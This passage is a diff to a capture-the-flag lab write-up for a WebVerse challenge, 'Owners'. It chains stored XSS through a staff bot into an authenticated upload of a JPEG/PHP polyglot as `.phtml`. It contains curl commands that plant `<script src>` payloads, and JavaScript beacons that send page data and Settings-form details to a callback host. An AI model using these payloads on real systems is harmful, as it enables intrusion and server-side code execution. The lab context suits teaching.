@@ -121,6 +121,20 @@ I kept the reproduction in the order I tested it. Each step starts with the requ
 6. Compare `.php`, `.php.jpg`, and `.phtml` using the same JPEG and PHP design.
 7. Stop after `.phtml` returns the challenge proof and WebVerse accepts it.
 
+### How Interact Fits into the Chain
+
+Interact was both the script host and the callback log. Every stage followed the same five-part flow:
+
+1. I deployed one JavaScript file to `https://<INTERACT_HOST>/__deploy_payload__`.
+2. I stored an HTTP script reference in the public contact message.
+3. The staff bot opened that stored message in `/admin/messages.php`.
+4. The script ran in the signed-in staff browser and made the same-origin Settings request or upload.
+5. The script sent only the result needed for that stage back to Interact.
+
+The payload deployment used HTTPS, but the stored script URL and callback used HTTP. Earlier HTTPS callback attempts produced no hit. I treated that as a transport problem, not as proof that the message was safe. The HTTP payload URL produced the first complete callback.
+
+This distinction also explains the Terminal section. `curl` deployed the script and submitted the public message. It did not perform the authenticated avatar upload. That request came from the staff browser with its existing session.
+
 ## 4. Caido/Burp Reproduction
 
 ### Step 1: Map the Contact Form
@@ -200,20 +214,24 @@ The server returned `200` with `Thanks, message sent.` This was the normal stora
 
 ### Step 5: Store the Script and Confirm Where It Runs
 
-The first script only sent the current path and page title to Interact.
+The first script only sent the current path and page title to Interact. It did not read the page body or copy the staff session. The full script is collapsed below so the proof chain stays easy to scan. Open it to inspect or copy the payload.
 
-```javascript
-(() => {
-  if (window.__ownersStage1) return;
-  window.__ownersStage1 = true;
-  new Image().src =
-    'http://<INTERACT_HOST>/owners-stage1' +
-    '?p=' + encodeURIComponent(location.pathname) +
-    '&t=' + encodeURIComponent(document.title);
-})();
+{{< interact-script track="caido" stage="stage1" >}}
+
+I saved the expanded block as `owners-stage1.js`. This small helper turns any saved script into the JSON body expected by Interact:
+
+```bash
+prepare_payload() {
+  local script="$1"
+  jq -n \
+    --arg name "$script" \
+    --rawfile content "$script" \
+    '{name:$name,content:$content}' \
+    > "$script.deploy.json"
+}
 ```
 
-I deployed it through the Interact payload endpoint and stored the script tag in the contact message.
+I deployed it through the HTTPS Interact payload endpoint and stored its HTTP script URL in the contact message.
 
 ```http
 POST /__deploy_payload__ HTTP/1.1
@@ -221,6 +239,15 @@ Host: <INTERACT_HOST>
 Content-Type: application/json
 
 {"name":"owners-stage1.js","content":"<STAGE_1_JAVASCRIPT>"}
+```
+
+```bash
+prepare_payload owners-stage1.js
+
+curl -sS -i -X POST \
+  'https://<INTERACT_HOST>/__deploy_payload__' \
+  -H 'Content-Type: application/json' \
+  --data-binary @owners-stage1.js.deploy.json
 ```
 
 ![Stage 1 payload deployment request and acceptance response](owners-04-stage1-deployment.png)
@@ -253,23 +280,70 @@ The callback reported `/admin/messages.php` and the title `Messages · Owners St
 
 **Figure 6: Staff-view execution.** The path and title show exactly where the stored script ran.
 
+![Interact history showing the Stage 1 request and HeadlessChrome callback context](owners-06a-interact-stage1-history.png)
+
+**Interact Stage 1 history.** The payload request and callback appear together. The selected callback includes the staff-browser headers, while the query records only the protected path and page title.
+
 ### Step 6: Read the Settings Form from the Staff Browser
 
-I used the same browser context for a read-only request to Settings. The callback returned only the response status, title, form contract, file-field name, and current avatar path.
+I used the same browser context for a read-only request to Settings. I first checked the raw HTML and then the parsed DOM for a WebVerse proof value. Both returned `NO_FLAG`. Those results only ruled out a literal proof in the tested Settings response. They did not rule out another authenticated action.
 
 ```javascript
-fetch('/admin/settings.php', { credentials: 'include' })
-  .then(r => r.text().then(html => ({ r, html })))
-  .then(({ r, html }) => {
-    const d = new DOMParser().parseFromString(html, 'text/html');
-    const f = d.querySelector(
-      'form[action="/admin/settings.php?action=avatar"]'
-    );
-    const file = f ? f.querySelector('input[type="file"]') : null;
-    const current = d.querySelector('img[alt="Current profile picture"]');
-    // Callback: status, title, form action, method, enctype,
-    // file-field name, and current avatar path.
-  });
+const html = await fetch('/admin/settings.php', {
+  credentials: 'include'
+}).then(response => response.text());
+
+const rawMatch = html.match(/WEBVERSE\{[^}]+\}/);
+const doc = new DOMParser().parseFromString(html, 'text/html');
+const domText = [
+  doc.documentElement.textContent,
+  ...[...doc.querySelectorAll('*')].flatMap(element => [
+    ...[...element.attributes].map(attribute => attribute.value),
+    'value' in element ? element.value : ''
+  ])
+].join('\n');
+const domMatch = domText.match(/WEBVERSE\{[^}]+\}/);
+
+// Both checks returned NO_FLAG on this response.
+```
+
+I then mapped the form structure. The callback returned only the response status, title, form actions, methods, encodings, field names and types, and image paths. I did not collect form values.
+
+{{< interact-script track="caido" stage="stage2" >}}
+
+```http
+POST /__deploy_payload__ HTTP/1.1
+Host: <INTERACT_HOST>
+Content-Type: application/json
+
+{"name":"owners-stage2.js","content":"<SETTINGS_MAPPER_JAVASCRIPT>"}
+```
+
+```bash
+prepare_payload owners-stage2.js
+
+curl -sS -i -X POST \
+  'https://<INTERACT_HOST>/__deploy_payload__' \
+  -H 'Content-Type: application/json' \
+  --data-binary @owners-stage2.js.deploy.json
+```
+
+`owners-stage2.js.deploy.json` contains the payload name and the JavaScript shown above. Keeping the script in a file avoids an unreadable one-line JSON command.
+
+```http
+POST /contact.php HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+name=Owners+Stage2&email=stage2%40example.test&message=%3Cscript+src%3D%22http%3A%2F%2F%3CINTERACT_HOST%3E%2F__p__%2Fowners-stage2.js%22%3E%3C%2Fscript%3E
+```
+
+```bash
+curl -sS -i 'https://<LAB_HOST>/contact.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode 'name=Owners Stage2' \
+  --data-urlencode 'email=stage2@example.test' \
+  --data-urlencode 'message=<script src="http://<INTERACT_HOST>/__p__/owners-stage2.js"></script>'
 ```
 
 ![Settings mapping payload deployment](owners-07-settings-payload-deployment.png)
@@ -286,9 +360,13 @@ Anonymous Settings requests returned `302`, but the staff browser received `200`
 
 **Figure 9: Authenticated pivot.** The callback confirms the avatar form from the signed-in staff context.
 
+![Interact history showing the Settings mapper request and callback](owners-09a-interact-settings-history.png)
+
+**Interact Stage 2 history.** The callback sits in the same request log as the Stage 1 proof. Its decoded result records the Settings page and avatar upload contract that guided the next test.
+
 ### Step 7: Compare Three Avatar Filenames
 
-Each test began with a valid JPEG, declared `image/jpeg`, and appended the PHP reader below. The three files followed the same design, but I do not claim that every byte was identical.
+Each test used the same 1,330-byte JPEG/PHP polyglot and declared `image/jpeg`. Only the filename, browser guard, and callback marker changed. The verified polyglot SHA-256 was `7863f1d9e57b4897783d9fac7ce7a41dc9d81fbe7897141a35e097d481c1937e` in both reproduction tracks.
 
 ```php
 <?php
@@ -329,6 +407,54 @@ echo 'NO_FLAG';
 
 The reader had no parameters, shell, command runner, directory walk, or persistence. It returned the first matching lab proof or `NO_FLAG`.
 
+The same browser-side upload logic was used for all three filenames. I changed only the filename, browser guard, payload name, and callback marker. Each test below now includes the complete script used for that stage. The same source logic is also shown with the Terminal/CLI values in the second reproduction.
+
+For each filename, I placed the stage script in a JSON deployment file and sent it to Interact:
+
+```json
+{
+  "name": "<STAGE_PAYLOAD_NAME>",
+  "content": "<AVATAR_UPLOAD_JAVASCRIPT>"
+}
+```
+
+```bash
+prepare_payload owners-stage3.js
+
+curl -sS -i -X POST \
+  'https://<INTERACT_HOST>/__deploy_payload__' \
+  -H 'Content-Type: application/json' \
+  --data-binary @owners-stage3.js.deploy.json
+```
+
+The three stage names were:
+
+| Test | Payload name | Upload filename | Deployment body |
+| --- | --- | --- | --- |
+| `.php` control | `owners-stage3.js` | `owners_flag_probe_run1.php` | `owners-stage3.js.deploy.json` |
+| `.php.jpg` control | `owners-stage3b.js` | `owners_flag_probe_run1.php.jpg` | `owners-stage3b.js.deploy.json` |
+| `.phtml` check | `owners-stage4.js` | `owners_flag_probe_run1.phtml` | `owners-stage4.js.deploy.json` |
+
+The public contact message then loaded the matching payload:
+
+```http
+POST /contact.php HTTP/1.1
+Host: <LAB_HOST>
+Content-Type: application/x-www-form-urlencoded
+
+name=<STAGE_NAME>&email=<STAGE_EMAIL>&message=%3Cscript+src%3D%22http%3A%2F%2F%3CINTERACT_HOST%3E%2F__p__%2F%3CSTAGE_PAYLOAD_NAME%3E%22%3E%3C%2Fscript%3E
+```
+
+```bash
+curl -sS -i 'https://<LAB_HOST>/contact.php' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data-urlencode 'name=<STAGE_NAME>' \
+  --data-urlencode 'email=<STAGE_EMAIL>' \
+  --data-urlencode 'message=<script src="http://<INTERACT_HOST>/__p__/<STAGE_PAYLOAD_NAME>"></script>'
+```
+
+The browser payload, not the public request, created the authenticated multipart upload.
+
 | Variant | Storage result | Direct handling |
 | --- | --- | --- |
 | `.php` | Current avatar stayed `default.jpg`; predicted file returned `404` | No execution |
@@ -338,6 +464,8 @@ The reader had no parameters, shell, command runner, directory walk, or persiste
 #### 7.1 `.php` Negative Control
 
 The staff browser generated the authenticated multipart request. The session value stayed in the browser.
+
+{{< interact-script track="caido" stage="stage3" >}}
 
 ```http
 POST /admin/settings.php?action=avatar HTTP/1.1
@@ -365,9 +493,24 @@ The upload page returned `200`, but the current avatar remained `default.jpg` an
 
 **Figure 11: `.php` control result.** The response is `NO_FLAG`, the avatar is unchanged, and the predicted resource is missing.
 
+![Interact history through the PHP upload control](owners-11a-interact-php-history.png)
+
+**Interact `.php` history.** The log keeps the Stage 1 and Settings callbacks next to the `.php` result. The selected callback reports the unchanged avatar and missing predicted resource.
+
 #### 7.2 `.php.jpg` Storage and Static-Serving Control
 
 I changed only the final filename. The callback showed the new resource as the current avatar and returned `200`, but it did not return a WebVerse proof value.
+
+{{< interact-script track="caido" stage="stage3b" >}}
+
+```bash
+prepare_payload owners-stage3b.js
+
+curl -sS -i -X POST \
+  'https://<INTERACT_HOST>/__deploy_payload__' \
+  -H 'Content-Type: application/json' \
+  --data-binary @owners-stage3b.js.deploy.json
+```
 
 ![Deployment of the PHP JPG control](owners-12-php-jpg-control-deployment.png)
 
@@ -376,6 +519,10 @@ I changed only the final filename. The callback showed the new resource as the c
 ![PHP JPG file stored without PHP output](owners-13-php-jpg-control-result.png)
 
 **Figure 13: `.php.jpg` control result.** The file becomes the current avatar, while the execution check remains `NO_FLAG`.
+
+![Interact history through the PHP JPG storage control](owners-13a-interact-phpjpg-history.png)
+
+**Interact `.php.jpg` history.** The new callback appears after the `.php` control and records the stored avatar path without a proof value.
 
 ```http
 GET /uploads/avatars/<PROBE_BASENAME>.php.jpg HTTP/1.1
@@ -394,6 +541,17 @@ curl -sS -D - -o /tmp/owners_probe.bin \
 #### 7.3 `.phtml` Execution Check
 
 For the final test I kept the JPEG and PHP design and changed the filename to `.phtml`.
+
+{{< interact-script track="caido" stage="stage4" >}}
+
+```bash
+prepare_payload owners-stage4.js
+
+curl -sS -i -X POST \
+  'https://<INTERACT_HOST>/__deploy_payload__' \
+  -H 'Content-Type: application/json' \
+  --data-binary @owners-stage4.js.deploy.json
+```
 
 ```text
 filename="<PROBE_BASENAME>.phtml"
@@ -417,9 +575,9 @@ source=/uploads/avatars/<PROBE_BASENAME>.phtml
 
 The callback returned `status=FLAG` and named the uploaded `.phtml` file as the source. This result is different from the static `.php.jpg` control and confirms PHP handling for the tested `.phtml` resource.
 
-![Redacted WebVerse proof returned from the PHTML resource](owners-17-phtml-proof-callback.png)
+![Interact payload registry containing all five Caido track scripts](owners-17a-interact-payload-registry.png)
 
-**Figure 17: `.phtml` execution.** The callback contains the redacted proof and the uploaded resource path.
+**Interact payload registry.** The final state contains the Stage 1, Settings, `.php`, `.php.jpg`, and `.phtml` scripts. The raw final callback screenshot is not published because its encoded query contained the literal challenge proof. The redacted query above preserves the result and source path.
 
 ### Step 8: Stop at the Solved State
 
@@ -432,6 +590,28 @@ WebVerse displayed `Challenge Solved` and `Flag accepted`. I did not send furthe
 ## 5. Terminal/CLI Reproduction
 
 I repeated the chain on a separate fresh instance. `curl` covered the public requests, triggers, and public file readback. The authenticated avatar upload still ran in the staff browser because I did not take its session.
+
+The Terminal/CLI run used the same browser-side logic as the Caido/Burp run. Only the payload names, guards, callback paths, and probe filenames changed to the `owners-cli-*` set recorded in the second Interact registry. Every step below includes its complete script in the collapsed Interact block.
+
+The Stage 1 evidence recorded an inline JSON command. The copyable version below uses the same content from a saved file, which keeps every stage readable:
+
+```bash
+deploy_payload() {
+  local script="$1"
+  jq -n \
+    --arg name "$script" \
+    --rawfile content "$script" \
+    '{name:$name,content:$content}' \
+    > "$script.deploy.json"
+
+  curl -sS -i -X POST \
+    'https://<INTERACT_HOST>/__deploy_payload__' \
+    -H 'Content-Type: application/json' \
+    --data-binary @"$script.deploy.json"
+}
+```
+
+Each saved JavaScript file uses the shared payload logic documented in both sections, with the `owners-cli-*` name and callback path for this second instance.
 
 ### Step 1: Confirm the Contact Contract
 
@@ -466,11 +646,10 @@ curl -sS -o /dev/null -D - \
 
 ### Step 3: Deploy and Trigger Stored XSS
 
+{{< interact-script track="cli" stage="stage1" >}}
+
 ```bash
-curl -sS -i -X POST \
-  'https://<INTERACT_HOST>/__deploy_payload__' \
-  -H 'Content-Type: application/json' \
-  --data-raw '{"name":"owners-cli-stage1.js","content":"(()=>{if(window.__ownersCliStage1)return;window.__ownersCliStage1=true;new Image().src=\"http://<INTERACT_HOST>/owners-cli-stage1-run1?p=\"+encodeURIComponent(location.pathname)+\"&t=\"+encodeURIComponent(document.title);})();"}'
+deploy_payload owners-cli-stage1.js
 ```
 
 ```bash
@@ -491,7 +670,17 @@ The callback again reported `/admin/messages.php` and the staff-page title.
 
 **Figure 23: CLI Stored XSS proof.** The message submitted by `curl` executes in the same protected viewer.
 
+![CLI Interact history showing the Stage 1 callback sequence](owners-23a-cli-interact-stage1-history.png)
+
+**CLI Interact Stage 1 history.** The request log connects the payload load to the callback from the protected message viewer.
+
 ### Step 4: Confirm the Settings Pivot
+
+{{< interact-script track="cli" stage="stage2" >}}
+
+```bash
+deploy_payload owners-cli-stage2.js
+```
 
 ```bash
 curl -sS -i 'https://<LAB_HOST>/contact.php' \
@@ -511,7 +700,17 @@ The callback returned Settings status `200`, the staff title, and the multipart 
 
 **Figure 25: CLI-assisted Settings proof.** The independent instance reaches the same authenticated form.
 
+![CLI Interact history through the Settings callback](owners-25a-cli-interact-settings-history.png)
+
+**CLI Interact Stage 2 history.** The Settings callback follows the Stored XSS callback and returns the same avatar form contract as the Caido track.
+
 ### Step 5: Repeat the `.php` Control
+
+{{< interact-script track="cli" stage="stage3" >}}
+
+```bash
+deploy_payload owners-cli-stage3.js
+```
 
 ```bash
 curl -sS -i 'https://<LAB_HOST>/contact.php' \
@@ -525,7 +724,17 @@ curl -sS -i 'https://<LAB_HOST>/contact.php' \
 
 **Figure 26: Independent `.php` control.** The upload page returns `200`, but the avatar remains `default.jpg` and the predicted resource returns `404`.
 
+![CLI Interact history through the PHP upload control](owners-26a-cli-interact-php-history.png)
+
+**CLI Interact `.php` history.** The callback records the unchanged avatar and missing `.php` resource after the public trigger.
+
 ### Step 6: Repeat the `.php.jpg` Control
+
+{{< interact-script track="cli" stage="stage3b" >}}
+
+```bash
+deploy_payload owners-cli-stage3b.js
+```
 
 ```bash
 curl -sS -i 'https://<LAB_HOST>/contact.php' \
@@ -538,6 +747,10 @@ curl -sS -i 'https://<LAB_HOST>/contact.php' \
 ![CLI PHP JPG storage callback](owners-27-cli-php-jpg-control.png)
 
 **Figure 27: Independent `.php.jpg` control.** The resource becomes the current avatar, returns `200`, and produces no proof value.
+
+![CLI Interact history through the PHP JPG storage control](owners-27a-cli-interact-phpjpg-history.png)
+
+**CLI Interact `.php.jpg` history.** This callback follows the `.php` control and records the stored multi-extension resource.
 
 ```bash
 curl -sS -D - -o /tmp/owners_cli_probe.bin \
@@ -558,6 +771,12 @@ xxd -l 32 /tmp/owners_cli_probe.bin
 
 ### Step 7: Repeat the `.phtml` Test
 
+{{< interact-script track="cli" stage="stage4" >}}
+
+```bash
+deploy_payload owners-cli-stage4.js
+```
+
 ```bash
 curl -sS -i 'https://<LAB_HOST>/contact.php' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
@@ -572,11 +791,17 @@ curl -sS -i 'https://<LAB_HOST>/contact.php' \
 
 The callback again returned `status=FLAG` and the uploaded `.phtml` path. The literal value is redacted.
 
-![Independent CLI track callback from the PHTML resource](owners-31-cli-phtml-callback.png)
+```text
+status=FLAG
+flag=WEBVERSE{REDACTED}
+source=/uploads/avatars/<PROBE_BASENAME>.phtml
+```
 
-**Figure 31: Independent `.phtml` result.** The second instance reaches the same PHP execution result.
+![CLI Interact payload registry containing all five scripts](owners-31a-cli-interact-payload-registry.png)
 
-The account had already marked Owners as solved during the Caido track, so the second instance could not create another account-level acceptance screen. Figure 18 is the platform confirmation. Figure 31 is the independent proof from the second instance.
+**CLI Interact payload registry.** The separate instance contains all five scripts used in order. The final raw callback screenshot is withheld because its encoded query contained the literal proof. The redacted result above records the status and source path.
+
+The account had already marked Owners as solved during the Caido track, so the second instance could not create another account-level acceptance screen. Figure 18 is the platform confirmation. The redacted CLI callback is the independent proof from the second instance.
 
 ## 6. Controls and Results
 
